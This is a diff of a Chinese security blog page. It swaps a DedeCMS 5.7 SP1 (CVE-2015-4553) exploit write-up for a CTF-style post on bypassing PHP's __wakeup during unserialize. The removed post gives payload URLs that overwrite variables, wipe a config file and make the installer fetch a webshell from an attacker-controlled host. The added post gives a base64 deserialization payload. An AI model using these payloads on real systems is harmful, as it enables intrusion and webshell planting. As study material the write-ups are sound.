@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="dedecms,">
+  <meta name="keywords" content="php反序列化,">
 
 
 
@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="DedeCMS 5.7 SP1 /install/index.php 任意远程文件写入漏洞点： 变量覆盖 1234foreach(Array(&apos;_GET&apos;,&apos;_POST&apos;,&apos;_COOKIE&apos;) as $_request)&amp;#123;    foreach($$_request as $_k =&amp;gt; $_v) $&amp;#123;$_k&amp;#125; = RunMagicQuotes($_v);&amp;#12">
-<meta name="keywords" content="dedecms">
+<meta name="description" content="反序列化小知识点序列化public private protect参数产生不同结果 测试代码 123456789&amp;lt;?php class test&amp;#123;     private $test1=&quot;hello&quot;;     public $test2=&quot;hello&quot;;     protected $test3=&quot;hello&quot;; &amp;#125; $test = new test(); echo s">
+<meta name="keywords" content="php反序列化">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CVE-2015-4553">
-<meta property="og:url" content="https://TGAOUT.github.io/2019/03/24/CVE-2015-4553/index.html">
+<meta property="og:title" content="&#39;反序列化bypass__wakeup方法&#39;">
+<meta property="og:url" content="https://TGAOUT.github.io/2019/04/22/反序列化bypass_wakeup方法/index.html">
 <meta property="og:site_name" content="TGAO&#39;s Blog">
-<meta property="og:description" content="DedeCMS 5.7 SP1 /install/index.php 任意远程文件写入漏洞点： 变量覆盖 1234foreach(Array(&apos;_GET&apos;,&apos;_POST&apos;,&apos;_COOKIE&apos;) as $_request)&amp;#123;    foreach($$_request as $_k =&amp;gt; $_v) $&amp;#123;$_k&amp;#125; = RunMagicQuotes($_v);&amp;#12">
+<meta property="og:description" content="反序列化小知识点序列化public private protect参数产生不同结果 测试代码 123456789&amp;lt;?php class test&amp;#123;     private $test1=&quot;hello&quot;;     public $test2=&quot;hello&quot;;     protected $test3=&quot;hello&quot;; &amp;#125; $test = new test(); echo s">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-03-24T12:19:21.712Z">
+<meta property="og:updated_time" content="2019-04-22T15:42:50.210Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CVE-2015-4553">
-<meta name="twitter:description" content="DedeCMS 5.7 SP1 /install/index.php 任意远程文件写入漏洞点： 变量覆盖 1234foreach(Array(&apos;_GET&apos;,&apos;_POST&apos;,&apos;_COOKIE&apos;) as $_request)&amp;#123;    foreach($$_request as $_k =&amp;gt; $_v) $&amp;#123;$_k&amp;#125; = RunMagicQuotes($_v);&amp;#12">
+<meta name="twitter:title" content="&#39;反序列化bypass__wakeup方法&#39;">
+<meta name="twitter:description" content="反序列化小知识点序列化public private protect参数产生不同结果 测试代码 123456789&amp;lt;?php class test&amp;#123;     private $test1=&quot;hello&quot;;     public $test2=&quot;hello&quot;;     protected $test3=&quot;hello&quot;; &amp;#125; $test = new test(); echo s">
 
 
 
@@ -120,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="https://TGAOUT.github.io/2019/03/24/CVE-2015-4553/">
+  <link rel="canonical" href="https://TGAOUT.github.io/2019/04/22/反序列化bypass_wakeup方法/">
 
 
 
 
 
-  <title>CVE-2015-4553 | TGAO's Blog</title>
+  <title>'反序列化bypass__wakeup方法' | TGAO's Blog</title>
   
 
 
@@ -253,7 +253,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://TGAOUT.github.io/2019/03/24/CVE-2015-4553/">
+    <link itemprop="mainEntityOfPage" href="https://TGAOUT.github.io/2019/04/22/反序列化bypass_wakeup方法/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="TGAO">
@@ -270,7 +270,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">CVE-2015-4553</h1>
+          <h1 class="post-title" itemprop="name headline">'反序列化bypass__wakeup方法'</h1>
         
 
         <div class="post-meta">
@@ -282,8 +282,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-24T20:16:57+08:00">
-                2019-03-24
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-22T22:02:16+08:00">
+                2019-04-22
               </time>
             
 
@@ -305,8 +305,8 @@
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
-                    <span itemprop="name">漏洞复现</span>
+                  <a href="/categories/php反序列化/" itemprop="url" rel="index">
+                    <span itemprop="name">php反序列化</span>
                   </a>
                 </span>
 
@@ -342,25 +342,19 @@
       
 
       
-        <h1 id="DedeCMS-5-7-SP1-install-index-php-任意远程文件写入"><a href="#DedeCMS-5-7-SP1-install-index-php-任意远程文件写入" class="headerlink" title="DedeCMS 5.7 SP1 /install/index.php 任意远程文件写入"></a>DedeCMS 5.7 SP1 /install/index.php 任意远程文件写入</h1><p>漏洞点：</p>
-<p>变量覆盖</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">Array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $_request)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_k =&gt; $_v) $&#123;$_k&#125; = RunMagicQuotes($_v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>利用</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(<span class="string">'../data/admin/config_update.php'</span>);</span><br><span class="line">	$rmurl = $UPDATEHOST.<span class="string">"dedecms/demodata.&#123;$s_lang&#125;.txt"</span>;</span><br><span class="line">	<span class="keyword">echo</span> $UPDATEHOST;</span><br><span class="line">	$sql_content = file_get_contents($rmurl);</span><br><span class="line">	<span class="comment">//var_dump($rmurl);</span></span><br><span class="line">	$fp = fopen($INSTALL_DEMO_NAME,<span class="string">'w'</span>);</span><br><span class="line">	<span class="keyword">if</span>(fwrite($fp,$sql_content))</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&amp;nbsp; &lt;font color="green"&gt;[√]&lt;/font&gt; 存在(您可以选择安装进行体验)'</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&amp;nbsp; &lt;font color="red"&gt;[×]&lt;/font&gt; 远程获取失败'</span>;</span><br></pre></td></tr></table></figure>
-<ol>
-<li><p>通过传参覆盖<code>$s_lang</code>变量和<code>$INSTALL_DEMO_NAME</code>变量</p>
-<p>payload1：<a href="http://127.0.0.1:99/install/index.php?s_lang=a&amp;INSLOCKFILE=a&amp;step=11&amp;INSTALL_DEMO_NAME=../data/admin/config_update.php" target="_blank" rel="noopener">http://127.0.0.1:99/install/index.php?s_lang=a&amp;INSLOCKFILE=a&amp;step=11&amp;INSTALL_DEMO_NAME=../data/admin/config_update.php</a></p>
-<p>导致<code>$rmurl</code>变量覆盖为<code>file_get_contents函数获取不到的资源</code></p>
-<p><code>$INSTALL_DEMO_NAME</code>变量覆盖为<code>../data/admin/config_update.php</code></p>
-<p>从而导致<code>../data/admin/config_update.php</code>文件为空文件，也就是删去了文件中的<code>$UPDATEHOST</code>变量，导致可以通过变量覆盖漏洞重写<code>$UPDATEHOST</code>为自己的vps服务器</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$content=file_get_contents(<span class="string">"http://xxx.xxx.xxx.xxx/l.txt"</span>);</span><br><span class="line">var_dump($content);<span class="comment">//The function returns the read data 或者在失败时返回 FALSE.这里构造一个不存在的资源，所以返回false</span></span><br><span class="line">$fp=fopen(<span class="string">"qqq.php"</span>,<span class="string">"w"</span>);</span><br><span class="line">var_dump(fwrite($fp,$content));<span class="comment">//fwrite返回写入的字符数，出错时返回flase，这里返回int 0</span></span><br><span class="line"><span class="keyword">if</span>(fwrite($fp,$content))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"fuck"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>覆盖<code>$UPDATEHOST</code>为自己的vps，在vps上放上shell文件<code>dedecms/demodata.a.txt</code>，覆盖<code>$INSTALL_DEMO_NAME</code>为要写入的文件名</p>
-<p>因为<code>fopen</code>函数遇到不存在的函数名，会自动创建文件名。</p>
-<p>payload2：<a href="http://127.0.0.1:99/install/index.php?step=11&amp;UPDATEHOST=http://xxx.xxx.xxx.xxx/&amp;INSTALL_DEMO_NAME=webshell.php&amp;s_lang=a&amp;INSLOCKFILE=a" target="_blank" rel="noopener">http://127.0.0.1:99/install/index.php?step=11&amp;UPDATEHOST=http://xxx.xxx.xxx.xxx/&amp;INSTALL_DEMO_NAME=webshell.php&amp;s_lang=a&amp;INSLOCKFILE=a</a></p>
-</li>
-</ol>
-<p>修复方案：将变量覆盖的代码移至文件最前面；或者通过define定义常量，是关键点无法被覆盖。</p>
+        <h1 id="反序列化小知识点"><a href="#反序列化小知识点" class="headerlink" title="反序列化小知识点"></a>反序列化小知识点</h1><p>序列化public private protect参数产生不同结果</p>
+<p>测试代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">     <span class="keyword">private</span> $test1=<span class="string">"hello"</span>;</span><br><span class="line">     <span class="keyword">public</span> $test2=<span class="string">"hello"</span>;</span><br><span class="line">     <span class="keyword">protected</span> $test3=<span class="string">"hello"</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> $test = <span class="keyword">new</span> test();</span><br><span class="line"> <span class="keyword">echo</span> serialize($test);  <span class="comment">//  O:4:"test":3:&#123;s:11:"\00test\00    test1";s:5:"hello";s:5:"test2";s:5:"hello";s:8:"\00*\00test3";s:5:"hello";&#125;</span></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>结论</p>
+<p>private的参数被反序列化后变成 <code>\00test\00test1</code> ,public的参数变成 <code>test2</code>   protected的参数变成 <code>\00*\00test3</code></p>
+<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sercet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">		 <span class="keyword">$this</span>-&gt;file=$file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> show_source(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]))&#123; </span><br><span class="line">    <span class="keyword">echo</span> show_source(<span class="string">'index.php'</span>,<span class="keyword">true</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    $cmd=base64_decode($_GET[<span class="string">'cmd'</span>]); </span><br><span class="line">    <span class="keyword">if</span> ((preg_match(<span class="string">'/[oc]:\d+:/i'</span>,$cmd))||(preg_match(<span class="string">'/flag/i'</span>,$cmd)))&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Are u gaoshing?"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        unserialize($cmd); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!--sercet in the_next.php--&gt;</span><br></pre></td></tr></table></figure>
+<p>the_next.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &apos;flag&#123;233333333333333333&#125;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这里正则用+号可以绕过去，比如 <code>o:+6:&#39;sercet&#39;....</code></p>
+<p>关键是在反序列化之前会调用<code>__wakeup</code>方法。这个方法会把<code>index.php</code>赋值给<code>$this-&gt;file</code>,从而无法读取文件。</p>
+<p>其实反序列时绕过<code>__wakeup</code>方法很简单，只要求反序列化后的对象属性多于真实属性个数即可。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?cmd=TzorNjoic2VyY2V0IjoyOntTOjEyOiJcMDBzZXJjZXRcMDBmaWxlIjtzOjEyOiJ0aGVfbmV4dC5waHAiO30KCgo=</span><br></pre></td></tr></table></figure>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>反序列化绕过wake_up方法：只要求反序列化后的对象属性多于真实属性个数即可。</p>
 
       
     </div>
@@ -378,7 +372,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/dedecms/" rel="tag"># dedecms</a>
+            <a href="/tags/php反序列化/" rel="tag"># php反序列化</a>
           
         </div>
       
@@ -391,8 +385,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/12/29/CTF_WP/" rel="next" title="SEVERAL_CTF_WP">
-                <i class="fa fa-chevron-left"></i> SEVERAL_CTF_WP
+              <a href="/2019/04/22/parse_url函数的bug/" rel="next" title="parse_url函数的bug">
+                <i class="fa fa-chevron-left"></i> parse_url函数的bug
               </a>
             
           </div>
@@ -401,8 +395,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/03/31/嘉韦思杯wp/" rel="prev" title="嘉韦思杯wp">
-                嘉韦思杯wp <i class="fa fa-chevron-right"></i>
+              <a href="/2019/04/24/mysql客户端读取任意文件/" rel="prev" title="'mysql客户端读取任意文件'">
+                'mysql客户端读取任意文件' <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -571,7 +565,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DedeCMS-5-7-SP1-install-index-php-任意远程文件写入"><span class="nav-text">DedeCMS 5.7 SP1 /install/index.php 任意远程文件写入</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#反序列化小知识点"><span class="nav-text">反序列化小知识点</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#源码"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#小结"><span class="nav-text">小结</span></a></li></ol></div>
             
 
           </div>
